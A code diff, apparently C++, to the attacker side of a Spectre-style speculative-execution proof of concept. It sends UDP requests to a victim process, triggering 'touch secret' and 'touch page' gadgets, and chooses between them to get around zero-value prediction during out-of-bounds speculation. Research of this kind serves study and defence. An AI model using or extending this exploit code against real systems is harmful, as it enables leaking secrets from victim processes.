@@ -307,11 +307,13 @@ void parse_args(int argc, char* const argv[]) {
       exit(EXIT_SUCCESS);
       break;
     case 't':  // Victim's secret VA address (size_t)
-      target_va = static_cast<uint64_t>(atoll(optarg));
+//      target_va = static_cast<uint64_t>(atoll(optarg));
+      target_va = convert_to_int<uint64_t>(optarg);
       found_target_va = true;
       break;
     case 'a': // Victim's array1 VA address (size_t)
-      target_array1_va = static_cast<uint64_t>(atoll(optarg));
+//      target_array1_va = static_cast<uint64_t>(atoll(optarg));
+      target_array1_va = convert_to_int<uint64_t>(optarg);
       found_array1_va = true;
       break;
     case 's':
@@ -569,18 +571,34 @@ inline void speculate(SocketUDP& s, size_t malicious_x) {
 }
 
 
-inline void gadget_touch_page(SocketUDP& s, size_t x) {
+inline void gadget_touch_secret(SocketUDP& s, size_t x) {
   // Send a single request with a malicious request:
   // Initialize target x to send to victim:
   msg m = {};
   m.x = x;
   m.fn = FN_TOUCH_SECRET;
 
-  // Send a burst of 5 training (valid) requests:
+  // Send a request which executes the touch secret gadget within victim:
   auto bytes = s.send(&m, sizeof(m));
   if ( unlikely(!(bytes > 0)) ) {
     // buffer/send error?
     std::cerr << "Failed to send FN_TOUCH_SECRET!" << std::endl;
+  }
+}
+
+
+inline void gadget_touch_page(SocketUDP& s, size_t x) {
+  // Send a single request with a malicious request:
+  // Initialize target x to send to victim:
+  msg m = {};
+  m.x = x;
+  m.fn = FN_TOUCH_PAGE;
+
+  // Send a request which executes the touch page gadget within victim:
+  auto bytes = s.send(&m, sizeof(m));
+  if ( unlikely(!(bytes > 0)) ) {
+    // buffer/send error?
+    std::cerr << "Failed to send FN_TOUCH_PAGE!" << std::endl;
   }
 }
 
@@ -744,12 +762,21 @@ void send_worker_v2(uint16_t port) {
     // Special Case: handle a potential minor page fault:
     if (zero_value_prediciton) {
       // Force a TLB hit by triggering a touch page gadget:
-      gadget_touch_page(s, secret_idx); // Critical to prevent zero-value prediction!
+      // - critical to prevent zero-value prediction!
+      auto mode = FN_NULL;
+      if (target_array1_va == 0) {
+        gadget_touch_secret(s, secret_idx);
+        mode = FN_TOUCH_SECRET;
+      }
+      else {
+        gadget_touch_page(s, malicious_x);
+        mode = FN_TOUCH_PAGE;
+      }
 
       // Expect confirmation of gadget from victim (optional):
       msg& m = reinterpret_cast<msg&>(buf);
       auto bytes = s.recv(buf, sizeof(buf));
-      if (bytes != sizeof(msg) || m.x != secret_idx || m.fn != FN_TOUCH_SECRET) {
+      if (bytes != sizeof(msg) || m.x != secret_idx || m.fn != mode) {
         std::cerr << "Unexpected touch confirmation..." << std::endl;
       }
 
